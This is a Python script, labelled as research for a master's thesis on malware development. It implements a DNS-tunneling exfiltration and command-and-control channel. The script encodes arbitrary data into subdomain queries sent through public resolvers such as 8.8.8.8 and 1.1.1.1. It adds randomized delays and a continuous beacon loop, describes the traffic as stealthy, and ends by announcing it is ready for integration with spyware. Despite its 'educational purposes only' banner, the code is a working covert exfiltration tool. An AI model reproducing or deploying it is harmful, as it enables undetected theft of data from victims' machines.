#!/usr/bin/env python3
"""
DNS Tunneling Setup untuk Penelitian Akademis
Implementasi praktis untuk C2 steganographic communication
"""

import dns.resolver
import base64
import time
import random
import string
import json
import hashlib
import socket
from datetime import datetime
import threading
import logging

# Setup logging untuk research
logging.basicConfig(level=logging.INFO, format='%(asctime)s - DNS_TUNNEL - %(message)s')

class AcademicDNSTunnel:
    """
    DNS Tunneling implementation untuk academic research
    Safe untuk controlled environment testing
    """
    
    def __init__(self, base_domain="research.local"):
        self.base_domain = base_domain
        self.resolver = dns.resolver.Resolver()
        
        # Use multiple DNS servers untuk redundancy
        self.resolver.nameservers = [
            '1.1.1.1',      # Cloudflare
            '8.8.8.8',      # Google Primary  
            '8.8.4.4',      # Google Secondary
            '208.67.222.222' # OpenDNS
        ]
        
        self.session_id = self._generate_session_id()
        self.query_count = 0
        self.max_label_length = 50  # DNS safe
        
        logging.info(f"🔧 DNS Tunnel initialized with session: {self.session_id}")
    
    def _generate_session_id(self):
        """Generate unique session ID untuk research tracking"""
        timestamp = str(int(time.time()))
        random_suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
        return f"{timestamp[:6]}{random_suffix}"
    
    def encode_data_for_dns(self, data, chunk_size=None):
        """
        Encode data untuk DNS transmission
        Returns list of DNS-safe chunks
        """
        if chunk_size is None:
            chunk_size = self.max_label_length
        
        try:
            # Convert to JSON if not string
            if not isinstance(data, str):
                data = json.dumps(data)
            
            # Base32 encoding (DNS-safe, no special chars)
            encoded = base64.b32encode(data.encode('utf-8')).decode().lower()
            
            # Remove padding untuk shorter queries
            encoded = encoded.rstrip('=')
            
            # Split into chunks
            chunks = []
            for i in range(0, len(encoded), chunk_size):
                chunk = encoded[i:i+chunk_size]
                chunks.append(chunk)
            
            logging.info(f"📦 Data encoded into {len(chunks)} DNS chunks")
            return chunks
            
        except Exception as e:
            logging.error(f"❌ Encoding error: {e}")
            return []
    
    def create_dns_query(self, chunk, chunk_index, total_chunks):
        """
        Create DNS query dengan metadata
        Format: [chunk].[index].[total].[session].[type].[domain]
        """
        try:
            # Add metadata untuk reconstruction
            query_domain = f"{chunk}.{chunk_index:03d}.{total_chunks:03d}.{self.session_id}.data.{self.base_domain}"
            
            # Ensure total length tidak exceed DNS limits (253 chars)
            if len(query_domain) > 253:
                # Fallback ke shorter format
                query_domain = f"{chunk}.{chunk_index}.{self.session_id}.d.{self.base_domain}"
            
            return query_domain
            
        except Exception as e:
            logging.error(f"❌ Query creation error: {e}")
            return None
    
    def send_dns_query(self, query_domain, delay_range=(0.5, 2.0)):
        """
        Send single DNS query dengan realistic timing
        """
        try:
            start_time = time.time()
            
            # Attempt resolution (expected to fail untuk steganography)
            try:
                result = self.resolver.resolve(query_domain, 'A')
                logging.info(f"🔍 Unexpected resolution: {query_domain} -> {result}")
            except dns.resolver.NXDOMAIN:
                # Expected result untuk steganographic queries
                pass
            except dns.resolver.NoAnswer:
                # Also acceptable untuk steganography
                pass
            except Exception as resolve_error:
                # Any resolver error is fine untuk steganography
                logging.debug(f"⚠️ Resolver error (expected): {resolve_error}")
            
            query_time = time.time() - start_time
            self.query_count += 1
            
            logging.info(f"📡 Query {self.query_count}: {query_domain[:50]}... ({query_time:.3f}s)")
            
            # Random delay untuk avoid rate limiting
            delay = random.uniform(*delay_range)
            time.sleep(delay)
            
            return True
            
        except Exception as e:
            logging.error(f"❌ DNS query error: {e}")
            return False
    
    def tunnel_data(self, data, session_description="research_data"):
        """
        Main function untuk tunneling data via DNS
        Returns success status dan metadata
        """
        try:
            logging.info(f"🚀 Starting DNS tunneling: {session_description}")
            start_time = time.time()
            
            # Encode data
            chunks = self.encode_data_for_dns(data)
            if not chunks:
                return False, "Encoding failed"
            
            total_chunks = len(chunks)
            successful_queries = 0
            
            # Send each chunk
            for i, chunk in enumerate(chunks):
                query_domain = self.create_dns_query(chunk, i, total_chunks)
                
                if query_domain and self.send_dns_query(query_domain):
                    successful_queries += 1
                else:
                    logging.warning(f"⚠️ Failed to send chunk {i}")
            
            # Summary
            total_time = time.time() - start_time
            success_rate = successful_queries / total_chunks
            
            metadata = {
                'session_id': self.session_id,
                'description': session_description,
                'total_chunks': total_chunks,
                'successful_queries': successful_queries,
                'success_rate': success_rate,
                'total_time': total_time,
                'queries_per_second': successful_queries / total_time if total_time > 0 else 0
            }
            
            logging.info(f"✅ DNS tunneling completed: {successful_queries}/{total_chunks} chunks "
                        f"({success_rate:.1%}) in {total_time:.2f}s")
            
            return success_rate > 0.8, metadata
            
        except Exception as e:
            logging.error(f"❌ DNS tunneling failed: {e}")
            return False, str(e)
    
    def continuous_tunnel(self, data_generator, interval=30):
        """
        Continuous tunneling untuk ongoing research monitoring
        """
        logging.info(f"🔄 Starting continuous DNS tunneling (interval: {interval}s)")
        
        tunnel_count = 0
        while True:
            try:
                # Generate research data
                if callable(data_generator):
                    data = data_generator()
                else:
                    data = data_generator
                
                # Tunnel data
                success, metadata = self.tunnel_data(data, f"continuous_research_{tunnel_count}")
                
                if success:
                    logging.info(f"✅ Continuous tunnel {tunnel_count} successful")
                else:
                    logging.warning(f"⚠️ Continuous tunnel {tunnel_count} failed")
                
                tunnel_count += 1
                time.sleep(interval)
                
            except KeyboardInterrupt:
                logging.info("🛑 Continuous tunneling stopped by user")
                break
            except Exception as e:
                logging.error(f"❌ Continuous tunneling error: {e}")
                time.sleep(interval)

def generate_research_data():
    """Generate sample research data untuk testing"""
    return {
        "type": "academic_research",
        "timestamp": datetime.now().isoformat(),
        "experiment": "dns_tunneling_validation", 
        "data": {
            "cpu_usage": random.uniform(10, 80),
            "memory_usage": random.uniform(30, 90),
            "process_count": random.randint(50, 150),
            "network_connections": random.randint(10, 50)
        },
        "metadata": {
            "researcher": "Academic S2 Student",
            "institution": "University Research",
            "purpose": "Malware Analysis Thesis"
        }
    }

def dns_tunnel_demo():
    """Demo DNS tunneling untuk academic research"""
    print("\n" + "="*60)
    print("🧪 DNS TUNNELING ACADEMIC RESEARCH DEMO")
    print("="*60)
    
    # Initialize tunnel
    tunnel = AcademicDNSTunnel("research.local")
    
    # Test 1: Simple data tunneling
    print("\n📊 Test 1: Basic Data Tunneling")
    test_data = generate_research_data()
    success, metadata = tunnel.tunnel_data(test_data, "basic_test")
    
    if success:
        print(f"✅ Basic test successful: {metadata['success_rate']:.1%} success rate")
    else:
        print(f"❌ Basic test failed: {metadata}")
    
    # Test 2: Larger data payload
    print("\n📊 Test 2: Large Payload Tunneling")
    large_data = {
        "research_type": "comprehensive_analysis",
        "data_points": [generate_research_data() for _ in range(5)],
        "analysis_results": "This is a larger payload to test chunking capabilities " * 10
    }
    
    success, metadata = tunnel.tunnel_data(large_data, "large_payload_test")
    if success:
        print(f"✅ Large payload test successful: {metadata['total_chunks']} chunks")
    else:
        print(f"❌ Large payload test failed")
    
    # Test 3: Rapid transmission
    print("\n📊 Test 3: Rapid Transmission Test") 
    rapid_data = {"test": "rapid_transmission", "timestamp": datetime.now().isoformat()}
    
    for i in range(3):
        success, metadata = tunnel.tunnel_data(rapid_data, f"rapid_test_{i}")
        print(f"   Transmission {i+1}: {'✅' if success else '❌'}")
        time.sleep(1)
    
    print(f"\n📈 Total DNS queries sent: {tunnel.query_count}")
    print("🔍 Monitor network traffic dengan Wireshark untuk detailed analysis")

def monitor_dns_traffic():
    """
    Monitor DNS traffic untuk research analysis
    (Simulation - dalam research nyata gunakan Wireshark/tcpdump)
    """
    print("\n🔍 DNS TRAFFIC MONITORING (Simulated)")
    print("-" * 40)
    
    # Simulate traffic monitoring
    monitored_queries = [
        f"pmrhi6lqmurduibcorsxg5bc.001.005.{int(time.time())}.data.research.local",
        f"zdamrvfuydmljsgbkdcmj2gu.002.005.{int(time.time())}.data.research.local", 
        f"c5dbei5caisunbuxgidjomqh.003.005.{int(time.time())}.data.research.local"
    ]
    
    for i, query in enumerate(monitored_queries):
        print(f"📡 [{datetime.now().strftime('%H:%M:%S')}] Query {i+1}: {query}")
        print(f"   └─ Response: NXDOMAIN (Expected untuk steganography)")
        time.sleep(0.5)
    
    print("\n📊 Traffic Analysis:")
    print("   • Pattern: Encoded data in subdomain")
    print("   • Frequency: Controlled intervals")
    print("   • Stealth: Appears as failed DNS lookups")
    print("   • Detection: Requires pattern analysis")

if __name__ == "__main__":
    print("🎓 ACADEMIC DNS TUNNELING RESEARCH FRAMEWORK")
    print("=" * 60)
    print("⚠️  FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY")
    print("📚 Thesis: Analisis dan Pengembangan Malware (S2)")
    print("=" * 60)
    
    try:
        # Run demo
        dns_tunnel_demo()
        
        # Monitor traffic simulation
        monitor_dns_traffic()
        
        print("\n🎯 DNS Tunneling Research Demo Completed!")
        print("📄 Check logs untuk detailed analysis")
        print("🔬 Ready untuk integration dengan improved spyware")
        
    except KeyboardInterrupt:
        print("\n🛑 Demo stopped by user")
    except Exception as e:
        print(f"\n❌ Demo error: {e}")
        logging.error(f"Demo failed: {e}")
